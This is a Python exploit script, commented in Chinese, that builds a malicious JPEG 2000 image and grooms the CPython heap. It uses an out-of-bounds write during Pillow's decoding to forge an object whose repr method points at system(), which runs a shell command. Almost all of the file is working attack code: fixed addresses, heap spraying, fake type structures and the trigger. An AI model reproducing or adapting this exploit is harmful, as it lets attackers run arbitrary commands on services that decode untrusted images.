#!/usr/bin/env python3
# rce_blind.py —— 盲打：一张 J2K 走完 解码 -> 越界写 -> 元组 item1 指向我方 blob -> repr -> system("id")
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

SYSTEM_PLT = 0x420580
PY_TUPLE   = 0xa38b60
NPAIR      = 128
NDRAIN     = 1024
OUT        = '/tmp/BLIND.j2k'

gc.disable()

blob = bytearray(519)
_k = ctypes.c_char.from_buffer(blob)
bd = ctypes.addressof(_k)
OFF_TYPE = 0x40


def fill(v):
    struct.pack_into('<Q', blob, 0x00, v)                      # 命令字节（= 假对象的 refcnt）
    struct.pack_into('<Q', blob, 0x08, bd + OFF_TYPE)          # ob_type -> 假类型
    struct.pack_into('<Q', blob, OFF_TYPE + 0x58, SYSTEM_PLT)   # tp_repr = system@plt


fill(0x6469)                                                   # "id\0"

if bd <= PY_TUPLE + 0x1000:                                    # builder 要求 A < B < C
    _p = bytes(bytearray(b'\x00' * (2 * 1024 * 1024)))
    blob = bytearray(519)
    _k = ctypes.c_char.from_buffer(blob)
    bd = ctypes.addressof(_k)
    fill(0x6469)
    del _p
    print('[i] 推高堆顶后 blob=%#x' % bd, flush=True)

print('[i] blob=%#x fake_type=%#x' % (bd, bd + OFF_TYPE), flush=True)

A_VAL = PY_TUPLE - 0x0c          # 实测: ob_type(+0x08) = A+12 ⇒ A 取 PT-12
B_VAL = PY_TUPLE                 # 落 ob_size(+0x10)：巨大无害（下标仍合法）
C_VAL = bd - 4                   # 实测: item2(+0x28) = C+4（e2=4 的偏移）⇒ C 取 bd-4
_D = os.path.dirname(os.path.abspath(__file__))     # 脚本自己所在目录（放哪都能跑）
MK13 = os.path.join(_D, 'mk13.py')
BASE = os.path.join(_D, 'base.j2k')
if not os.path.exists(BASE):
    BASE = '/tmp/exp/base.j2k'                      # 兼容旧路径
r = subprocess.run(['python3', MK13, BASE, OUT,
                    '0', '23', hex(A_VAL), hex(B_VAL), hex(C_VAL), '-370', '4'],
                   capture_output=True, text=True)
print('[i] build:', (r.stdout + r.stderr).strip()[:120], flush=True)
if 'OK' not in r.stdout:
    sys.exit(1)

drain = [bytes(bytearray(b'D' * 519)) for _ in range(NDRAIN)]
a, b, c, d, e = object(), object(), object(), object(), object()
tdrain = [(a, b, c, d, e) for _ in range(256)]   # 排空 0x50 档 ⇒ 新元组必然从堆顶切（紧跟 gap）
pairs = []
for _ in range(NPAIR):
    gap = bytes(bytearray(b'G' * 519))
    t = (a, b, c, d, e) * 22     # 110 项 ⇒ 块 0x390（与 A-2=0x391 完全对上）
    pairs.append((gap, t))
gold = [(g, t) for (g, t) in pairs if id(t) - id(g) == 0x240]
print('[i] 相邻对 %d/%d' % (len(gold), NPAIR), flush=True)

tinies = [t for (g, t) in pairs]
holes = [g for (g, t) in gold[:16]]
del pairs, gold
gc.collect()
del holes
gc.collect()
print('[i] 洞已放好，解码...', flush=True)

M = open(OUT, 'rb').read()
im = Image.open(io.BytesIO(M))
im.load()
print('[i] 解码完成', flush=True)

hit = 0
PT = id(tuple)
for t in tinies:
    if ctypes.c_uint64.from_address(id(t) + 0x08).value != PT:
        continue
    if ctypes.c_uint64.from_address(id(t) + 0x28).value != bd:
        continue
    hit += 1
    print('[+] HIT tuple@%#x  item2 = blob(%#x) ✓' % (id(t), bd), flush=True)
    val = t[2]
    for k in range(1, 5):
        fill(0x6469 - k)
        try:
            repr(val)
        except BaseException:
            pass
        try:
            print(val)
        except BaseException:
            pass
    break

print('[done] hit=%d' % hit, flush=True)
os._exit(0)